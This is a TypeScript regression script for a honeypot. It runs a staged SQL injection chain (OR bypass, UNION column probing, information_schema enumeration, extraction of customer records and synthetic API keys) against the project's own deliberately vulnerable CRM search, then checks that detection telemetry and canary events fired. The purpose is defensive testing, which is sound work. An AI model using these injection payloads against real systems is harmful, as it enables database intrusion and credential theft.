import postgres from "postgres";

/**
 * Local-only verification for the CRM search SQL injection (docs/VULNERABILITY.md) — walks the
 * same discover → probe → confirm → enumerate → extract → reuse chain a real attacker would,
 * against a running honeypot instance with CRM_SEARCH_VULNERABLE=true, then checks the DB
 * directly to confirm every stage actually produced the telemetry it should have. Not exposed
 * publicly and never run automatically — a manual regression check for this one feature.
 *
 * Usage: HONEYPOT_URL=http://localhost:8181 DATABASE_URL=postgres://... pnpm tsx scripts/simulate-sqli-attack.ts
 */

const BASE = process.env.HONEYPOT_URL ?? "http://localhost:8181";
const connectionString = process.env.DATABASE_URL;
if (!connectionString) throw new Error("DATABASE_URL is required (superuser — reads events/canary_events directly)");
const sql = postgres(connectionString, { max: 1 });

let failures = 0;
function check(label: string, ok: boolean, detail?: string) {
  console.log(`  [${ok ? "PASS" : "FAIL"}] ${label}${detail ? ` — ${detail}` : ""}`);
  if (!ok) failures++;
}

async function search(term: string) {
  const url = `${BASE}/api/v1/customers?search=${encodeURIComponent(term)}`;
  const res = await fetch(url, { headers: { "User-Agent": "sqli-researcher/1.0" } });
  const body = await res.json().catch(() => null);
  return { status: res.status, body: body as { data?: Array<Record<string, unknown>>; total?: number; error?: unknown } | null };
}

async function main() {
  console.log(`Simulating a realistic SQLi discovery-to-exploitation chain against ${BASE}\n`);

  console.log("1. Discover the feature");
  const discover = await fetch(`${BASE}/customers`);
  check("customers page exists", discover.status === 200);

  console.log("\n2. Test normal input (establish a baseline)");
  // A rare-ish term rather than a common name — with thousands of seeded rows, common names
  // legitimately hit the result cap on their own, which would make this an unreliable baseline.
  const baseline = await search("zzz-no-such-customer-zzz");
  check("normal search for a non-existent term returns nothing", baseline.body?.total === 0, `total=${baseline.body?.total}`);

  console.log("\n3. Try malformed input — a real researcher's first move, not a magic payload");
  const malformed = await search("O'Brien");
  console.log(`   -> status ${malformed.status}, total ${malformed.body?.total ?? "n/a"}`);

  console.log("\n4. Detect anomalous behavior — the classic OR-based bypass");
  const anomaly = await search("x' OR '1'='1' --");
  const baselineCount = baseline.body?.total ?? 0;
  const anomalyCount = anomaly.body?.total ?? 0;
  check("bypass returns far more rows than the baseline search (LIMIT itself got bypassed)", anomalyCount > baselineCount + 50, `baseline=${baselineCount}, bypass=${anomalyCount}`);

  console.log("\n5. Investigate database behavior — probe column count for a UNION");
  let unionColumns = 0;
  for (let n = 4; n <= 8; n++) {
    const nulls = Array(n).fill("NULL").join(", ");
    const res = await search(`x' UNION SELECT ${nulls} --`);
    if (res.status === 200) {
      unionColumns = n;
      break;
    }
  }
  check("found a working UNION column count via trial and error", unionColumns > 0, `columns=${unionColumns}`);

  console.log("\n6. Enumerate synthetic schema via information_schema");
  // NULL (not table_name) goes in the first two positions — those columns are uuid in the base
  // query, and Postgres rejects a UNION that puts a text value where the corresponding column
  // is uuid-typed. table_name lands in position 3, which is text ("name") in the base query.
  const enumerate = await search("x' UNION SELECT NULL, NULL, table_name, NULL, NULL, NULL FROM information_schema.tables WHERE table_name LIKE 'crm_%' --");
  const discoveredTables = (enumerate.body?.data ?? []).map((r) => r.name).filter(Boolean);
  check("discovered crm_* table names without being told them", discoveredTables.some((t) => String(t).includes("crm_api_integrations")), `found: ${discoveredTables.join(", ")}`);

  console.log("\n7. Retrieve records from the primary table (already accessible, confirms read access)");
  const records = await search("x' UNION SELECT customer_id, org_id, name, email, company, status FROM crm_customers --");
  check("extracted customer records via UNION", (records.body?.total ?? 0) > 100, `total=${records.body?.total}`);

  console.log("\n8. Discover synthetic sensitive information — pivot to the integrations table");
  const secrets = await search("x' UNION SELECT integration_id, org_id, provider, api_key, webhook_url, provider FROM crm_api_integrations --");
  // api_key lands under the "email" key here — 4th column position in both the base query and
  // this UNION, same reason as the table-enumeration step above.
  const leakedKey = (secrets.body?.data ?? []).map((r) => String(r.email ?? "")).find((v) => v.startsWith("sk_live_"));
  check("extracted a synthetic API key", Boolean(leakedKey), leakedKey ?? "none found");

  console.log("\n9. Post-exploitation — try the leaked key somewhere else on the site");
  if (leakedKey) {
    await fetch(`${BASE}/customers?search=${encodeURIComponent(leakedKey)}`);
  }

  console.log("\nWaiting 3s for async telemetry to flush...");
  await new Promise((r) => setTimeout(r, 3000));

  console.log("\n--- Verifying telemetry landed correctly ---");
  const [events] = await sql<{ probe: number; confirmed: number; extraction: number }[]>`
    SELECT
      count(*) FILTER (WHERE event_type = 'SQLI_PROBE')::int AS probe,
      count(*) FILTER (WHERE event_type = 'SQLI_CONFIRMED')::int AS confirmed,
      count(*) FILTER (WHERE event_type = 'DATA_EXTRACTION')::int AS extraction
    FROM events
    WHERE created_at >= now() - interval '2 minutes'
  `;
  check("SQLI_CONFIRMED events recorded", (events?.confirmed ?? 0) > 0, `count=${events?.confirmed}`);
  check("DATA_EXTRACTION events recorded", (events?.extraction ?? 0) > 0, `count=${events?.extraction}`);

  if (leakedKey) {
    const [canary] = await sql<{ n: number }[]>`
      SELECT count(*)::int AS n
      FROM canary_events ce
      JOIN canary_objects co ON co.canary_id = ce.canary_id
      WHERE co.value = ${leakedKey} AND ce.created_at >= now() - interval '2 minutes'
    `;
    check("reusing the leaked key triggered a canary event", (canary?.n ?? 0) > 0, `count=${canary?.n}`);
  }

  console.log(`\n${failures === 0 ? "All checks passed." : `${failures} check(s) failed.`}`);
  await sql.end();
  process.exit(failures === 0 ? 0 : 1);
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
